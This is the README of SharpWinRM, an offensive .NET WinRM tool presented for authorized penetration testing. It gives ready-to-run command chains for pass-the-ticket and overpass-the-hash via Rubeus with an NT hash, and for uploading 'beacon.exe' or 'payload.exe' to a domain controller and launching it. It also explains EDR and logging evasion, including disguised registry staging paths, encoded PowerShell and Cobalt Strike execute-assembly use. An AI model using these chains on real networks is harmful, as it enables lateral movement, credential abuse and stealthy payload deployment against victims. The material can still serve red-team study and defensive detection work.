# SharpWinRM

A .NET 4.8 WinRM client for authorized penetration testing. Supports command execution, file upload, file download, and port scanning via multiple authentication modes including Kerberos pass-the-ticket and pass-the-hash (via Rubeus).

---

## Table of Contents

- [Building](#building)
- [How It Works](#how-it-works)
- [Authentication Modes](#authentication-modes)
- [Pass-the-Hash with Rubeus](#pass-the-hash-with-rubeus)
- [Commands](#commands)
- [Opsec Notes](#opsec-notes)
- [Usage Examples](#usage-examples)

---

## Building

### Prerequisites

- [.NET SDK](https://dotnet.microsoft.com/download) (any recent version — 6, 7, 8)
- **.NET Framework 4.8 targeting pack** — required because the project targets `net48`
  - Already present on any Windows machine with .NET 4.8 installed
  - On a fresh build machine: install via Visual Studio Installer → Individual Components → ".NET Framework 4.8 targeting pack", or download directly from Microsoft

No third-party NuGet packages are used. All references (`Microsoft.CSharp`, `System.Net.Http`) are .NET Framework assemblies already on the machine.

### CLI (dotnet)

```
cd SharpWinRM
dotnet build -c Release
```

`dotnet build` automatically runs `dotnet restore` first, which contacts NuGet to pull down the SDK build tooling (not external packages — the project has none). If you're building on an air-gapped machine, run `dotnet restore` once with internet access first; subsequent builds will use the local cache.

Output: `SharpWinRM\bin\Release\net48\SharpWinRM.exe`

### Visual Studio

1. Open `SharpWinRM.sln`
2. Set configuration to **Release** (dropdown at the top)
3. **Build → Build Solution** (or `Ctrl+Shift+B`)

Output: `SharpWinRM\bin\Release\net48\SharpWinRM.exe`

### Single-file publish (optional)

```
dotnet publish -c Release -r win-x64 --self-contained false
```

This produces the same `SharpWinRM.exe` in `bin\Release\net48\win-x64\publish\`. For `execute-assembly` use, the standard `dotnet build` output is sufficient.

---

## How It Works

### WinRM / WS-Management Protocol

WinRM (Windows Remote Management) is Microsoft's implementation of the [WS-Management](https://www.dmtf.org/standards/wsman) (WS-Man) SOAP protocol. It listens on:

- **Port 5985** — HTTP transport
- **Port 5986** — HTTPS transport (TLS)

All communication is SOAP XML over HTTP(S). SharpWinRM uses the **WSMan.Automation COM object** (`wsmauto.dll`) — the same library used by PowerShell Remoting and the built-in `winrm.exe` — so the WinRM traffic is indistinguishable from legitimate Windows remote management activity.

### Execution Model

SharpWinRM uses two distinct remote execution mechanisms depending on the operation:

**`exec` — PowerShell Remoting Protocol (PSRP)**

Opens a PSRP runspace via `WSManConnectionInfo` targeting the `Microsoft.PowerShell` endpoint. The PowerShell engine runs in-process inside `wsmprovhost.exe` — no child process is spawned, and the command never appears in any process argument list. Identical to `Invoke-Command`.

**`upload` / `download` — WMI Method Invocation over WS-Man**

Uses `StdRegProv` and `Win32_Process` WMI methods delivered as WS-Man SOAP actions — not the WinRM shell API. The remote process tree shows `wmiprvse.exe` (WMI host), not `wsmprovhost.exe` (WinRM host), making it appear as WMI activity rather than WinRM activity. File data and paths travel as base64-encoded registry values, never as plain-text process arguments.

### HTTP vs HTTPS

| | Port 5985 (HTTP) | Port 5986 (HTTPS) |
|---|---|---|
| Transport encryption | None | TLS — hides all HTTP framing |
| Content encryption | NTLM/Kerberos message-level sealing | TLS + NTLM/Kerberos |
| Wire visibility | HTTP headers visible, SOAP body encrypted | Everything encrypted |
| Recommendation | Use when 5986 unavailable | Preferred for opsec |

Over HTTP, NTLM and Kerberos both provide **message-level encryption** of the SOAP body via RC4/AES sealing — the actual command content is not cleartext even without TLS. However, HTTPS additionally hides HTTP metadata (headers, request size, timing) from network monitoring.

---

## Authentication Modes

### `/password:` — Plaintext Credentials

```
/user:DOMAIN\user /password:Pass1
```

**How it works:**

1. Calls `LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS=9, WINNT50)` to create a *netonly* logon session
2. Impersonates that session for the WinRM call
3. WSMan.Automation uses Windows SSPI — Windows chooses NTLM or Kerberos based on environment

The type-9 logon never validates credentials against a DC locally — it only affects outbound network authentication. Credentials are not cached in your existing session.

**Opsec considerations:**
- Plaintext password passes through LSASS for the LogonUser call
- NTLM challenge-response visible on the wire (detectable)
- Windows event log: Logon Type 9 (NewCredentials) on the local machine

---

### `/ptt` — Pass-the-Ticket (existing session)

```
/user:DOMAIN\user /ptt
```

**How it works:**

Uses the Kerberos ticket(s) already present in your current logon session. Verify with `klist`. WSMan.Automation uses SSPI which picks up the existing TGT/service ticket automatically — no credential material is passed.

**Opsec considerations:**
- No credentials in memory beyond what's already there
- Kerberos TGS-REQ/TGS-REP for the WinRM service principal (indistinguishable from normal auth)
- No NTLM traffic
- **Most opsec-safe option when you already have a valid ticket**

---

### `/ticket:` — Import Kerberos Ticket (isolated session)

```
/user:DOMAIN\user /ticket:user.kirbi
/user:DOMAIN\user /ticket:doIFuj...  (base64 kirbi)
```

**How it works:**

1. Calls `LogonUser(dummy_creds, LOGON32_LOGON_NEW_CREDENTIALS=9)` to create a fresh isolated logon session with a new LUID — credentials are never validated
2. Calls `DuplicateTokenEx` to get an impersonation token for the new session
3. Calls `WindowsIdentity.Impersonate()` — the current thread now runs as the isolated session
4. Calls `LsaCallAuthenticationPackage(KerbSubmitTicketMessage)` with the kirbi bytes — imports the TGT into the isolated session's Kerberos cache (LUID `{0,0}` resolves to the impersonated session, not your real session)
5. Makes the WinRM call under impersonation — SSPI picks up the ticket from the isolated session
6. On `Dispose()`: reverts impersonation, closes token handles — Windows destroys the logon session and purges its Kerberos ticket cache automatically

**Your session is never touched.** `klist` before and after will show no change.

**Opsec considerations:**
- No NTLM traffic — pure Kerberos
- The ticket is isolated and self-cleaning
- No new process spawned (unlike `runas /netonly`)
- Kerberos TGS-REQ for `http/target` SPN is normal DC traffic

---

## Pass-the-Hash with Rubeus

Windows SSPI has no public API that accepts an NT hash directly — it requires a plaintext password to derive the hash internally. To use an NT hash with SharpWinRM, use Rubeus to convert the hash into a Kerberos TGT (overpass-the-hash / AS-REQ with RC4 pre-auth), then pass the ticket.

### Step 1 — Request a TGT from the NT hash

```
Rubeus.exe asktgt /user:jdoe /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /outfile:jdoe.kirbi
```

Rubeus sends a Kerberos AS-REQ to the Domain Controller using the NT hash as the RC4 session key for pre-authentication. The DC validates the hash against its copy in AD and returns a TGT encrypted for the user.

Alternatively, request in base64 format (no file written to disk):
```
Rubeus.exe asktgt /user:jdoe /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /nowrap
```

### Step 2 — Use the ticket with SharpWinRM

```
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:jdoe.kirbi /command:whoami
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:doIFuj...   /command:whoami
```

The `/ticket:` path accepts either a `.kirbi` file path or the raw base64 string from Rubeus's `nowrap` output.

### Why not direct NTLM PTH?

NTLM pass-the-hash over WinRM requires a manual NTLM implementation that bypasses Windows SSPI entirely — constructing NTLMv2 challenge-response manually and handling WinRM's multipart message-level encryption. This approach conflicts with IIS/WinRM server configurations in many environments (MaxRequestBytes limits, WAF rules, strict Negotiate-only enforcement). The Rubeus workflow is more reliable and produces Kerberos traffic, which is less suspicious than NTLM.

---

## Commands

### `scan` — Port Discovery

```
SharpWinRM.exe scan /target:HOST
```

TCP connect check on ports 5985 and 5986. No authentication required. Use this first to determine whether to use `/ssl`.

```
[*] Target : srv01.corp.local

[+] 5985 OPEN  — WinRM HTTP  (use without /ssl)
[+] 5986 OPEN  — WinRM HTTPS (use /ssl for encrypted transport)

[*] Recommendation: use /ssl (port 5986) — TLS hides SOAP traffic from the wire
```

---

### `exec` — Command Execution

```
SharpWinRM.exe exec /target:HOST <auth> /command:PS_COMMAND
```

Executes a PowerShell command using the **PowerShell Remoting Protocol (PSRP)** — the same protocol used by `Invoke-Command` and `Enter-PSSession`. Accepts any PowerShell syntax including pipelines:

```
SharpWinRM.exe exec ... /command:whoami
SharpWinRM.exe exec ... /command:Get-LocalUser
SharpWinRM.exe exec ... /command:Get-Process | Select-Object Name,Id | Sort-Object Id
```

**Remote process tree:** `svchost.exe (WsmSvc) → wsmprovhost.exe`

No `cmd.exe`, no `powershell.exe` child — the PowerShell engine runs in-process inside `wsmprovhost.exe` via `pwrshplugin.dll`. The command never appears in any process argument list. This is identical to what a legitimate admin session produces.

**How it works:**

Uses `System.Management.Automation.dll` (Windows PowerShell 5.1, present on all modern Windows) to open a PSRP runspace via `WSManConnectionInfo` targeting:
```
http://schemas.microsoft.com/powershell/Microsoft.PowerShell
```
Output is piped through `Out-String` so complex objects (`Get-Process`, `Get-LocalUser`, etc.) render as formatted text.

**What EDR sees on the remote host:**
- `wsmprovhost.exe` activity — indistinguishable from `Invoke-Command` or `Enter-PSSession`
- No child process spawned — no Sysmon Event ID 1 for the command
- AMSI inspects the script block at runtime inside `wsmprovhost.exe`
- Script Block Logging (Event ID 4104) captures the command if enabled

---

### `upload` — File Upload via WMI

```
SharpWinRM.exe upload /target:HOST <auth> /local:C:\tools\beacon.exe /remote:C:\Windows\Temp
```

If `/remote:` is a directory path (no file extension, or trailing `\`), the local filename is appended automatically:
```
/remote:C:\Windows\Temp          → C:\Windows\Temp\beacon.exe
/remote:C:\Windows\Temp\         → C:\Windows\Temp\beacon.exe
/remote:C:\Windows\Temp\b.exe    → C:\Windows\Temp\b.exe
```

**Remote process tree:**
```
svchost.exe (WinMgmt)
  └── wmiprvse.exe
        └── powershell.exe -EncodedCommand <b64>  [brief — reassembly only]
```

**How it works:**

1. **`StdRegProv.CreateKey` + `SetStringValue` (loop)** — stages 48 KB base64-encoded chunks into a randomly named HKLM subkey. No child process — handled entirely inside `wmiprvse.exe`.
2. **`Win32_Process.Create`** — spawns a brief `powershell.exe` with `-EncodedCommand` to read the chunks from registry, write to the target file, then set a `done` sentinel. File data and path are not in plain-text process args.
3. **`Win32_Process?Handle=<pid>` (poll)** — polls the spawned PID via WS-Man Get every second until the process exits. No separate child process.
4. **`StdRegProv.GetStringValue`** — reads the `done` sentinel once after the process exits to detect any remote write error.
5. **`StdRegProv.DeleteKey`** — removes the entire staging key. No child process.

**Staging location:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Diagnostics\WinUpd_<random>`

**What EDR sees on the remote host:**
- WMI activity on `wmiprvse.exe` for all registry staging operations (no process created)
- Brief `powershell.exe` child of `wmiprvse.exe` — parent is WMI host, not WinRM svchost
- File data never appears in any process command line
- Registry write + delete at a plausible-looking HKLM path

---

### `download` — File Download via WMI

```
SharpWinRM.exe download /target:HOST <auth> /remote:C:\path\file.txt /local:output.txt
SharpWinRM.exe download /target:HOST <auth> /remote:C:\path\file.txt /local:C:\Users\me\
SharpWinRM.exe download /target:HOST <auth> /remote:C:\path\file.txt
```

`/local:` is optional. If omitted, the file is saved to the current directory using the remote filename. If `/local:` points to an existing directory or ends with `\`, the remote filename is appended automatically:
```
(omitted)                    → .\file.txt  (current directory)
/local:C:\Users\me           → C:\Users\me\file.txt
/local:C:\Users\me\out.txt   → C:\Users\me\out.txt
```

**Remote process tree:**
```
svchost.exe (WinMgmt)
  └── wmiprvse.exe
        └── powershell.exe -EncodedCommand <b64>  [brief — encoding only]
```

**How it works:**

1. **`Win32_Process.Create`** — spawns a brief `powershell.exe` with `-EncodedCommand` to base64-encode the remote file and write it to a randomly named HKLM staging value. File path not in plain-text args.
2. **`StdRegProv.GetStringValue` (poll)** — reads the staged data. No child process — pure `wmiprvse.exe`.
3. **`StdRegProv.DeleteValue`** — removes the staging value. No child process.

**Staging location:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Diagnostics\<random value>`

**What EDR sees on the remote host:**
- Brief `powershell.exe` child of `wmiprvse.exe` (parent is WMI host, not WinRM svchost)
- File path not visible in process args (encoded command)
- Registry read via WMI (no child process) for the actual data retrieval

---

## Opsec Notes

### Local machine (where SharpWinRM runs)

- WSMan.Automation (`wsmauto.dll`) is loaded in-process — **no new processes created**
- Designed for inline execution from Cobalt Strike `execute-assembly`
- For `/ticket:`: no `runas /netonly`, no child process, no LSASS interaction beyond standard SSPI

### Remote machine (target)

| Operation | Remote process tree | Data in command line |
|---|---|---|
| `exec` | `svchost (WsmSvc) → wsmprovhost.exe` (no children) | No process spawned |
| `upload` | `svchost (WinMgmt) → wmiprvse.exe → powershell.exe` (brief) | No — path/data in encoded command |
| `download` | `svchost (WinMgmt) → wmiprvse.exe → powershell.exe` (brief) | No — path in encoded command |

### Authentication opsec ranking

1. **`/ptt`** — Best. Uses existing ticket, no new logon session, no credential material
2. **`/ticket:`** — Best for imported hashes. Isolated session, self-cleaning, pure Kerberos
3. **`/password:`** — Acceptable. Type-9 logon (no local validation), but NTLM on the wire is detectable

### Network indicators

- WinRM traffic to port 5985/5986 from an unexpected host may trigger alerts
- Kerberos TGS-REQ for `http/target.domain` SPN is logged on the DC (normal Kerberos behavior)
- NTLM authentication (password mode in non-Kerberos environments) is logged on the DC and visible on the wire

---

## Usage Examples

```
# Discover WinRM ports first
SharpWinRM.exe scan /target:srv01.corp.local

# Execute with plaintext credentials (HTTPS)
SharpWinRM.exe exec /target:srv01 /domain:CORP /user:jdoe /password:Pass1! /ssl /command:whoami

# Execute using existing Kerberos ticket
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:ipconfig /all

# PTH workflow: NT hash → TGT → exec
Rubeus.exe asktgt /user:jdoe /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /nowrap
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:doIFuj... /command:whoami

# PTH workflow with kirbi file
Rubeus.exe asktgt /user:jdoe /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /outfile:jdoe.kirbi
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:jdoe.kirbi /command:whoami /ssl

# Upload payload (PowerShell via stdin — no data in command line)
SharpWinRM.exe upload /target:srv01 /user:CORP\jdoe /ptt /local:beacon.exe /remote:C:\Windows\Temp

# Execute command via PSRP (wsmprovhost.exe only — no child process, blends with admin traffic)
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:whoami
SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:Get-LocalUser

# Download output file via WMI (wmiprvse.exe — path not in process args)
SharpWinRM.exe download /target:srv01 /user:CORP\jdoe /ptt /remote:C:\Windows\Temp\output.txt /local:output.txt

# Full PTH chain over HTTPS
Rubeus.exe asktgt /user:svc_admin /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /outfile:svc.kirbi
SharpWinRM.exe scan    /target:dc01.corp.local
SharpWinRM.exe upload  /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /local:payload.exe /remote:C:\Windows\Temp
SharpWinRM.exe exec    /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /command:Start-Process C:\Windows\Temp\payload.exe
SharpWinRM.exe download /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /remote:C:\Windows\Temp\out.txt /local:out.txt
```

---

## Full Argument Reference

```
SharpWinRM.exe <command> [options]

COMMANDS
  scan      /target:HOST
  exec      /target:HOST <auth> /command:PS_COMMAND   (PSRP — wsmprovhost.exe, no child process)
  upload    /target:HOST <auth> /local:PATH /remote:PATH        (WMI registry staging — wmiprvse.exe)
  download  /target:HOST <auth> /remote:PATH [/local:PATH]      (WMI registry staging — wmiprvse.exe)

AUTH (pick one)
  /password:PASS     Plaintext password (requires /user: and optionally /domain:)
  /ptt               Use Kerberos ticket already in current session
  /ticket:VALUE      Import kirbi file or base64 kirbi string into isolated session

REQUIRED (exec / upload / download)
  /target:HOST       Hostname or IP of the remote machine
  /user:USER         Username — accepts DOMAIN\USER or user@domain formats
  /domain:DOMAIN     Domain (if not embedded in /user:)

OPTIONS
  /port:N            WinRM port (default: 5985)
  /ssl               Use HTTPS/TLS (defaults to port 5986)
  /timeout:MS        Timeout in milliseconds (default: 30000)
  /nocolors          Disable colored output (useful for log capture)
```
